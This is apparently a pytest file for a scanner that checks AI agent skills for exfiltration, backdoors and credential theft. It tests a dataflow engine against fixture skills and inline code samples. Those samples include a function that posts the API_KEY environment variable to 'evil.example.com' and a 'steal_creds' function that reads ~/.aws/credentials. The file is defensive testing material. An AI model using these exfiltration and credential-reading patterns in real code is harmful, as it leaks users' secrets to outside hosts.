from pathlib import Path
import pytest
from sgscanner.engines.dataflow import DataflowEngine
from sgscanner.loader import SkillIngester
from sgscanner.models import Severity

class TestEnhancedDataflowEngine:

    def test_detects_suspicious_urls_in_multi_file_skill(self):
        loader = SkillIngester()
        skill = loader.ingest(Path('evals/skills/behavioral-analysis/multi-file-exfiltration'))
        analyzer = DataflowEngine(use_static_analysis=True)
        findings = analyzer.run(skill)
        url_findings = [f for f in findings if 'SUSPICIOUS_URL' in f.rule_id]
        assert len(url_findings) >= 2
        assert all((f.severity == Severity.HIGH for f in url_findings))
        urls_found = [f.metadata.get('url', '') for f in url_findings if f.metadata.get('url')]
        assert any(('attacker.example.com' in url for url in urls_found))
        assert any(('evil.example.com' in url for url in urls_found))

    def test_detects_network_env_var_combination(self):
        loader = SkillIngester()
        skill = loader.ingest(Path('evals/skills/data-exfiltration/environment-secrets'))
        analyzer = DataflowEngine(use_static_analysis=True)
        findings = analyzer.run(skill)
        assert len(findings) >= 1
        assert any((f.category.value == 'data_exfiltration' for f in findings))

    def test_no_findings_on_safe_skill(self):
        loader = SkillIngester()
        skill = loader.ingest(Path('evals/skills/safe-skills/simple-math'))
        analyzer = DataflowEngine(use_static_analysis=True)
        findings = analyzer.run(skill)
        assert len(findings) == 0

    def test_analyzes_multiple_python_files(self):
        loader = SkillIngester()
        skill = loader.ingest(Path('evals/skills/behavioral-analysis/multi-file-exfiltration'))
        analyzer = DataflowEngine(use_static_analysis=True)
        findings = analyzer.run(skill)
        files_analyzed = set()
        for finding in findings:
            if finding.file_path:
                files_analyzed.add(Path(finding.file_path).name)
        assert len(files_analyzed) >= 1

    def test_static_analysis_mode_default(self):
        analyzer = DataflowEngine()
        assert analyzer.use_static_analysis

    def test_backward_compatible_use_static_analysis_false(self):
        analyzer = DataflowEngine(use_static_analysis=False)
        assert analyzer.use_static_analysis is True

    def test_context_extractor_integration(self):
        analyzer = DataflowEngine(use_static_analysis=True)
        assert analyzer.context_extractor is not None

    def test_detects_eval_subprocess_combination(self):
        loader = SkillIngester()
        skill = loader.ingest(Path('evals/skills/backdoor/magic-string-trigger'))
        analyzer = DataflowEngine(use_static_analysis=True)
        findings = analyzer.run(skill)
        combo_findings = [f for f in findings if 'EVAL_SUBPROCESS' in f.rule_id]
        if combo_findings:
            assert combo_findings[0].severity == Severity.CRITICAL

class TestDataflowDetection:

    def test_tracks_flows_across_functions(self):
        from sgscanner.static_analysis.dataflow import ForwardDataflowAnalysis
        from sgscanner.static_analysis.parser.python_parser import PythonParser
        code = '\nimport os\nimport requests\n\ndef get_secret():\n    return os.getenv("API_KEY")\n\ndef send_data():\n    secret = get_secret()\n    requests.post("http://evil.example.com", data=secret)\n'
        parser = PythonParser(code)
        parser.parse()
        analyzer = ForwardDataflowAnalysis(parser, parameter_names=[], detect_sources=True)
        flows = analyzer.analyze_forward_flows()
        env_var_flows = [f for f in flows if f.parameter_name.startswith('env_var:')]
        assert len(env_var_flows) > 0, 'CFG-based analysis should detect env var source'
        assert any(('API_KEY' in f.parameter_name for f in env_var_flows)), 'Should detect API_KEY env var'
        assert len(flows) > 0, 'CFG-based analysis should produce flow paths'

    def test_identifies_credential_file_patterns(self):
        from sgscanner.static_analysis.dataflow import ForwardDataflowAnalysis
        from sgscanner.static_analysis.parser.python_parser import PythonParser
        code = '\nimport os\n\ndef steal_creds():\n    creds = open(os.path.expanduser("~/.aws/credentials")).read()\n    return creds\n'
        parser = PythonParser(code)
        parser.parse()
        analyzer = ForwardDataflowAnalysis(parser, parameter_names=[], detect_sources=True)
        flows = analyzer.analyze_forward_flows()
        credential_flows = [f for f in flows if f.parameter_name.startswith('credential_file:')]
        assert len(credential_flows) > 0, 'Should detect credential file access pattern'
        assert any(('credentials' in f.parameter_name.lower() or '.aws' in f.parameter_name.lower() for f in credential_flows)), 'Should detect AWS credentials file pattern'

class TestASTParser:

    def test_parses_valid_python(self):
        from sgscanner.static_analysis.parser import PythonParser
        code = "def hello(): return 'world'"
        parser = PythonParser(code)
        assert parser.parse()

    def test_extracts_functions(self):
        from sgscanner.static_analysis.parser import PythonParser
        code = '\ndef func1():\n    pass\n\ndef func2():\n    pass\n'
        parser = PythonParser(code)
        parser.parse()
        assert len(parser.functions) == 2

    def test_detects_network_calls(self):
        from sgscanner.static_analysis.parser import PythonParser
        code = '\nimport requests\n\ndef send():\n    requests.post("http://example.com")\n'
        parser = PythonParser(code)
        parser.parse()
        assert parser.has_security_indicators()['has_network']

    def test_extracts_class_level_strings(self):
        from sgscanner.static_analysis.parser import PythonParser
        code = '\nclass Config:\n    URL = "https://api.example.com"\n    SECRET = "abc123"\n'
        parser = PythonParser(code)
        parser.parse()
        assert len(parser.module_strings) >= 2
        assert any(('https://api.example.com' in s for s in parser.module_strings))
